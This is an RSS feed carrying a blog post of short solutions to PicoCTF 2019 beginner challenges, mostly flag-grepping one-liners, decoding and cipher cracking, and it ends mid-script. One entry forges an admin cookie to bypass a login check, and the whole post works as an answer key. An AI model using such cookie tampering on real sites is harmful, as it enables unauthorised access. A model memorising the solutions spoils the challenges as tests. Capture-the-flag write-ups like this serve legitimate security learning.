<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Poney Island</title><link>https://0xade1.github.io/posts/</link><description>Recent content in Posts on Poney Island</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 17 Aug 2022 03:42:29 +0800</lastBuildDate><atom:link href="https://0xade1.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>PicoCTF2019</title><link>https://0xade1.github.io/posts/2022/08/picoctf2019/</link><pubDate>Wed, 17 Aug 2022 03:42:29 +0800</pubDate><guid>https://0xade1.github.io/posts/2022/08/picoctf2019/</guid><description>vault-door-training grep password.equals VaultDoorTraining.java | cut -d'&amp;quot;' -f2 | awk '{printf &amp;quot;picoCTF{%s}\n&amp;quot;, $1}' Insp3ct0r for i in &amp;quot;&amp;quot; mycss.css myjs.js ; do curl -s https://jupiter.challenges.picoctf.org/problem/9670/$i | grep flag | cut -d':' -f2 | cut -d' ' -f2 | tr -d &amp;quot;\n&amp;quot; ; done &amp;amp;&amp;amp; echo Lets Warm Up 1 print(&amp;#34;picoCTF{%s}&amp;#34; % (chr(int(&amp;#39;70&amp;#39;, 16)))) Glory of the Garden strings garden.jpg | grep pico xxd garden.jpg | tail Warmed Up 1 print(&amp;#34;picoCTF{%s}&amp;#34; % int(&amp;#39;3d&amp;#39;, 16)) The Numbers 1 2 tbl = [16,9,3,15,3,20,6,20,8,5,14,21,13,2,5,18,19,13,1,19,15,14] print(&amp;#34;picoCTF{%s}&amp;#34; % &amp;#39;&amp;#39;.</description><content type="html"><![CDATA[<h2 id="vault-door-training">vault-door-training</h2>
<pre><code>grep password.equals VaultDoorTraining.java | cut -d'&quot;' -f2 | awk '{printf &quot;picoCTF{%s}\n&quot;, $1}'
</code></pre>
<h2 id="insp3ct0r">Insp3ct0r</h2>
<pre><code>for i in &quot;&quot; mycss.css myjs.js ; do curl -s https://jupiter.challenges.picoctf.org/problem/9670/$i | grep flag | cut -d':' -f2 | cut -d' ' -f2 | tr -d &quot;\n&quot; ; done &amp;&amp; echo
</code></pre>
<h2 id="lets-warm-up">Lets Warm Up</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;picoCTF{</span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">}&#34;</span> <span style="color:#ff79c6">%</span> (<span style="color:#8be9fd;font-style:italic">chr</span>(<span style="color:#8be9fd;font-style:italic">int</span>(<span style="color:#f1fa8c">&#39;70&#39;</span>, <span style="color:#bd93f9">16</span>))))
</code></pre></td></tr></table>
</div>
</div><h2 id="glory-of-the-garden">Glory of the Garden</h2>
<pre><code>strings garden.jpg | grep pico
xxd garden.jpg | tail
</code></pre>
<h2 id="warmed-up">Warmed Up</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;picoCTF{</span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">}&#34;</span> <span style="color:#ff79c6">%</span> <span style="color:#8be9fd;font-style:italic">int</span>(<span style="color:#f1fa8c">&#39;3d&#39;</span>, <span style="color:#bd93f9">16</span>))
</code></pre></td></tr></table>
</div>
</div><h2 id="the-numbers">The Numbers</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3">tbl <span style="color:#ff79c6">=</span> [<span style="color:#bd93f9">16</span>,<span style="color:#bd93f9">9</span>,<span style="color:#bd93f9">3</span>,<span style="color:#bd93f9">15</span>,<span style="color:#bd93f9">3</span>,<span style="color:#bd93f9">20</span>,<span style="color:#bd93f9">6</span>,<span style="color:#bd93f9">20</span>,<span style="color:#bd93f9">8</span>,<span style="color:#bd93f9">5</span>,<span style="color:#bd93f9">14</span>,<span style="color:#bd93f9">21</span>,<span style="color:#bd93f9">13</span>,<span style="color:#bd93f9">2</span>,<span style="color:#bd93f9">5</span>,<span style="color:#bd93f9">18</span>,<span style="color:#bd93f9">19</span>,<span style="color:#bd93f9">13</span>,<span style="color:#bd93f9">1</span>,<span style="color:#bd93f9">19</span>,<span style="color:#bd93f9">15</span>,<span style="color:#bd93f9">14</span>]
<span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;picoCTF{</span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">}&#34;</span> <span style="color:#ff79c6">%</span> <span style="color:#f1fa8c">&#39;&#39;</span><span style="color:#ff79c6">.</span>join([<span style="color:#8be9fd;font-style:italic">chr</span>(x<span style="color:#ff79c6">+</span><span style="color:#bd93f9">96</span>) <span style="color:#ff79c6">for</span> x <span style="color:#ff79c6">in</span> tbl[<span style="color:#bd93f9">7</span>:]]))
</code></pre></td></tr></table>
</div>
</div><h2 id="2warm">2Warm</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;picoCTF{</span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">}&#34;</span> <span style="color:#ff79c6">%</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">{0:b}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(<span style="color:#bd93f9">42</span>))
</code></pre></td></tr></table>
</div>
</div><h2 id="where-are-the-robots">where are the robots</h2>
<pre><code>URL=https://jupiter.challenges.picoctf.org/problem/56830/
page=$(curl -Ls $URL/robots.txt | grep Disallow | cut -d' ' -f2)
curl -Ls $URL/$page | grep picoCTF | cut -d'&gt;' -f2 | cut -d'&lt;' -f1
</code></pre>
<h2 id="vault-door-1">vault-door-1</h2>
<pre><code>flag=$(
  curl -sL https://jupiter.challenges.picoctf.org/static/87e103a8db01087de9ccf5a7a022ddf8/VaultDoor1.java |
  grep charAt | cut -d'(' -f2 | sort -n | cut -d&quot;'&quot; -f2 | tr -d &quot;\n&quot;
)
echo &quot;picoCTF{$flag}&quot;
</code></pre>
<h2 id="what-s-a-netcat">what s a netcat?</h2>
<pre><code>nc jupiter.challenges.picoctf.org 41120 | grep pico
</code></pre>
<h2 id="strings-it">strings it</h2>
<pre><code>curl -sL https://jupiter.challenges.picoctf.org/static/fae9ac5267cd6e44124e559b901df177/strings | strings | grep pico
</code></pre>
<h2 id="easy1">Easy1</h2>
<p>Cyberchef: <a href="https://cyberchef.org/#recipe=Vigen%C3%A8re_Decode('SOLVECRYPTO')&amp;input=VUZKS1hRWlFVTkI">https://cyberchef.org/#recipe=Vigen%C3%A8re_Decode('SOLVECRYPTO')&amp;input=VUZKS1hRWlFVTkI</a></p>
<h2 id="logon">logon</h2>
<ol>
<li>sign in with <code>joe:joe</code></li>
<li>with developer tools, look at the cookies</li>
<li>change <code>admin</code> cookie from <code>False</code> to <code>True</code></li>
<li>reload the page</li>
</ol>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl -Ls --cookie <span style="color:#f1fa8c">&#34;admin=True&#34;</span> https://jupiter.challenges.picoctf.org/problem/44573/flag |
grep pico | cut -d<span style="color:#f1fa8c">&#39;&gt;&#39;</span> -f5 | cut -d<span style="color:#f1fa8c">&#39;&lt;&#39;</span> -f1
</code></pre></td></tr></table>
</div>
</div><h2 id="13">13</h2>
<pre><code>echo &quot;cvpbPGS{abg_gbb_onq_bs_n_ceboyrz}&quot; | tr &quot;[a-zA-Z]&quot; &quot;[n-za-mN-ZA-M]&quot;
</code></pre>
<h2 id="caesar">caesar</h2>
<pre><code>caesar=$(curl -Ls https://jupiter.challenges.picoctf.org/static/7d707a443e95054dc4cf30b1d9522ef0/ciphertext)
echo $caesar | cut -d'{' -f2 | cut -d'}' -f1
</code></pre>
<p>Cyberchef: <a href="https://cyberchef.org/#recipe=Vigen%C3%A8re_Decode('b')&amp;input=ZHNwdHRqb2h1aWZzdmNqZHBvZWtvZnBiZGk">https://cyberchef.org/#recipe=Vigen%C3%A8re_Decode('b')&amp;input=ZHNwdHRqb2h1aWZzdmNqZHBvZWtvZnBiZGk</a></p>
<h2 id="dont-use-client-side">dont-use-client-side</h2>
<pre><code>curl -Ls https://jupiter.challenges.picoctf.org/problem/17682/ |
grep &quot;checkpass.substring&quot; | cut -d'(' -f3 | cut -d',' -f2 | sort | cut -d&quot;'&quot; -f2 |  tr -d &quot;\n&quot; &amp;&amp; echo
</code></pre>
<h2 id="bases">Bases</h2>
<pre><code>echo &quot;bDNhcm5fdGgzX3IwcDM1&quot; | base64 -d | awk '{printf &quot;picoCTF{%s}\n&quot;, $1}'
</code></pre>
<h2 id="first-grep">First Grep</h2>
<pre><code>curl -Ls https://jupiter.challenges.picoctf.org/static/515f19f3612bfd97cd3f0c0ba32bd864/file | grep pico
</code></pre>
<h2 id="so-meta">So Meta</h2>
<pre><code>curl -Ls https://jupiter.challenges.picoctf.org/static/916b07b4c87062c165ace1d3d31ef655/pico_img.png | exiftool  - | grep pico | awk '{print $3}'
</code></pre>
<h2 id="shark-on-wire-1">shark on wire 1</h2>
<ol>
<li>Download pcap</li>
<li>open with Wireshark</li>
<li>select filter <code>udp.stream eq 6</code></li>
<li>Follow UDP stream</li>
</ol>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tshark -q -r capture.pcap -z follow,udp,raw,6 | egrep <span style="color:#f1fa8c">&#34;^[0-9]&#34;</span> | xxd -r -p
</code></pre></td></tr></table>
</div>
</div><p>We can also iterate over every udp streams:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">for</span> stream in <span style="color:#f1fa8c">`</span>tshark -q -r capture.pcap -T fields -e udp.stream | sort -n | uniq<span style="color:#f1fa8c">`</span> ;
<span style="color:#ff79c6">do</span>
    tshark -q -r capture.pcap -z follow,udp,raw,<span style="color:#8be9fd;font-style:italic">$stream</span> | egrep <span style="color:#f1fa8c">&#34;^[0-9]&#34;</span> | xxd -r -p | grep picoCTF ;
<span style="color:#ff79c6">done</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="extensions">extensions</h2>
<pre><code>curl -sLO https://jupiter.challenges.picoctf.org/static/e7e5d188621ee705ceeb0452525412ef/flag.txt
file flag.txt
</code></pre>
<p>According to <code>file</code> command, this is not a text file, but a png</p>
<pre><code>mv flag.txt flag.png
tesseract flag.png flag.txt
cat flag.txt.txt
</code></pre>
<h2 id="what-lies-within">What Lies Within</h2>
<pre><code>zsteg buildings.png | grep pico | cut -d'&quot;' -f2
</code></pre>
<h2 id="la-cifra-de">la cifra de</h2>
<p>The fastest way to crack this challenge is to use this <a href="https://www.guballa.de/vigenere-solver">online Vigenere solver</a></p>
<pre tabindex="0"><code>nc jupiter.challenges.picoctf.org 5726 | tee enc.txt
Encrypted message:
Ne iy nytkwpsznyg nth it mtsztcy vjzprj zfzjy rkhpibj nrkitt ltc tnnygy ysee itd tte cxjltk

Ifrosr tnj noawde uk siyyzre, yse Bnretèwp Cousex mls hjpn xjtnbjytki xatd eisjd

Iz bls lfwskqj azycihzeej yz Brftsk ip Volpnèxj ls oy hay tcimnyarqj dkxnrogpd os 1553 my Mnzvgs Mazytszf Merqlsu ny hox moup Wa inqrg ipl. Ynr. Gotgat Gltzndtg Gplrfdo

Ltc tnj tmvqpmkseaznzn uk ehox nivmpr g ylbrj ts ltcmki my yqtdosr tnj wocjc hgqq ol fy oxitngwj arusahje fuw ln guaaxjytrd catizm tzxbkw zf vqlckx hizm ceyupcz yz tnj fpvjc hgqqpohzCZK{m311a50_0x_a1rn3x3_h1ah3x6kp60egf}

Ehk ktryy herq-ooizxetypd jjdcxnatoty ol f aordllvmlbkytc inahkw socjgex, bls sfoe gwzuti 1467 my Rjzn Hfetoxea Gqmexyt.

Tnj Gimjyèrk Htpnjc iy ysexjqoxj dosjeisjd cgqwej yse Gqmexyt Doxn ox Fwbkwei Inahkw.

Tn 1508, Ptsatsps Zwttnjxiax tnbjytki ehk xz-cgqwej ylbaql rkhea (g rltxni ol xsilypd gqahggpty) ysaz bzuri wazjc bk f nroytcgq nosuznkse ol yse Bnretèwp Cousex.

Gplrfdo’y xpcuso butvlky lpvjlrki tn 1555 gx l cuseitzltoty ol yse lncsz. Yse rthex mllbjd ol yse gqahggpty fce tth snnqtki cemzwaxqj, bay ehk fwpnfmezx lnj yse osoed qptzjcs gwp mocpd hd xegsd ol f xnkrznoh vee usrgxp, wnnnh ify bk itfljcety hizm paim noxwpsvtydkse.
</code></pre><ul>
<li>We clearly see a section which looks like an encoded flag: <code>pohzCZK{m311a50_0x_a1rn3x3_h1ah3x6kp60egf}</code>.</li>
<li>And we can assume that <code>pohzCZK</code> translates into <code>picoCTF</code>.</li>
<li>It can t be a substitution algorithm because letter &lsquo;c&rsquo; and &lsquo;C&rsquo; are not mapping with &lsquo;h&rsquo; and &lsquo;C&rsquo; which are not the same letter.</li>
<li>Therefore it is more likely a Vigenere and we can get 7 characters from the key with this code:</li>
</ul>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3">enc <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;pohzCZK&#34;</span>
dec <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;picoCTF&#34;</span>
enc <span style="color:#ff79c6">=</span> [<span style="color:#8be9fd;font-style:italic">ord</span>(x) <span style="color:#ff79c6">for</span> x <span style="color:#ff79c6">in</span> enc]
dec <span style="color:#ff79c6">=</span> [<span style="color:#8be9fd;font-style:italic">ord</span>(x) <span style="color:#ff79c6">for</span> x <span style="color:#ff79c6">in</span> dec]
key <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>
<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">0</span>, <span style="color:#8be9fd;font-style:italic">len</span>(enc)):
  key <span style="color:#ff79c6">+=</span> <span style="color:#8be9fd;font-style:italic">chr</span>(<span style="color:#8be9fd;font-style:italic">ord</span>(<span style="color:#f1fa8c">&#39;a&#39;</span>) <span style="color:#ff79c6">+</span> (enc[i] <span style="color:#ff79c6">-</span> dec[i]))
<span style="color:#8be9fd;font-style:italic">print</span>(key)
</code></pre></td></tr></table>
</div>
</div><p>output:</p>
<pre><code>agflagf
</code></pre>
<p>We can see a 4 letters pattern, so it could be a 4 letters key: <code>agfl</code> or <code>gfla</code> or <code>flag</code> or <code>lagf</code></p>
<p>We can try them all, but <code>flag</code> seems to be a good first candidates:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#6272a4">#!/usr/bin/env python</span>

file <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">&#34;enc.txt&#34;</span>, <span style="color:#f1fa8c">&#34;r&#34;</span>, encoding<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;utf-8&#34;</span>)
ctext <span style="color:#ff79c6">=</span> file<span style="color:#ff79c6">.</span>read()

keyword <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;flag&#39;</span>

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">do_vigenere</span>(char):
    <span style="color:#ff79c6">if</span> char<span style="color:#ff79c6">.</span>isalpha() <span style="color:#ff79c6">and</span> <span style="color:#8be9fd;font-style:italic">ord</span>(char) <span style="color:#ff79c6">&gt;</span> <span style="color:#8be9fd;font-style:italic">ord</span>(<span style="color:#f1fa8c">&#39;a&#39;</span>) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">and</span> <span style="color:#8be9fd;font-style:italic">ord</span>(char) <span style="color:#ff79c6">&lt;</span> <span style="color:#8be9fd;font-style:italic">ord</span>(<span style="color:#f1fa8c">&#39;z&#39;</span>) <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>:
        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">True</span>
    <span style="color:#ff79c6">elif</span> char<span style="color:#ff79c6">.</span>isalpha() <span style="color:#ff79c6">and</span> <span style="color:#8be9fd;font-style:italic">ord</span>(char) <span style="color:#ff79c6">&gt;</span> <span style="color:#8be9fd;font-style:italic">ord</span>(<span style="color:#f1fa8c">&#39;A&#39;</span>) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">and</span> <span style="color:#8be9fd;font-style:italic">ord</span>(char) <span style="color:#ff79c6">&lt;</span> <span style="color:#8be9fd;font-style:italic">ord</span>(<span style="color:#f1fa8c">&#39;Z&#39;</span>) <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>:
        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">True</span>
    <span style="color:#ff79c6">else</span>:
        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">False</span>

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">vigenere_decrypt</span>(encrypted_vigener, keyword):
    keyword_length <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">len</span>(keyword)
    keyword_as_int <span style="color:#ff79c6">=</span> [<span style="color:#8be9fd;font-style:italic">ord</span>(i) <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> keyword]
    keyword_caps_as_int <span style="color:#ff79c6">=</span> [<span style="color:#8be9fd;font-style:italic">ord</span>(i) <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> keyword<span style="color:#ff79c6">.</span>upper()]
    encrypted_vigener_int <span style="color:#ff79c6">=</span> [<span style="color:#8be9fd;font-style:italic">ord</span>(i) <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> encrypted_vigener]
    plaintext <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>
    j <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>
    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#8be9fd;font-style:italic">len</span>(encrypted_vigener_int)):
        <span style="color:#ff79c6">if</span> do_vigenere(ctext[i]):
            j <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">1</span>
            offset <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">65</span>
            flag_key <span style="color:#ff79c6">=</span> keyword_caps_as_int[j <span style="color:#ff79c6">%</span> keyword_length]
            <span style="color:#ff79c6">if</span> encrypted_vigener_int[i] <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">96</span>:
                offset <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">97</span>
                flag_key <span style="color:#ff79c6">=</span> keyword_as_int[j <span style="color:#ff79c6">%</span> keyword_length]
            value <span style="color:#ff79c6">=</span> (encrypted_vigener_int[i] <span style="color:#ff79c6">-</span> flag_key) <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">26</span>
            plaintext <span style="color:#ff79c6">+=</span> <span style="color:#8be9fd;font-style:italic">chr</span>(value <span style="color:#ff79c6">+</span> offset)
        <span style="color:#ff79c6">else</span>:
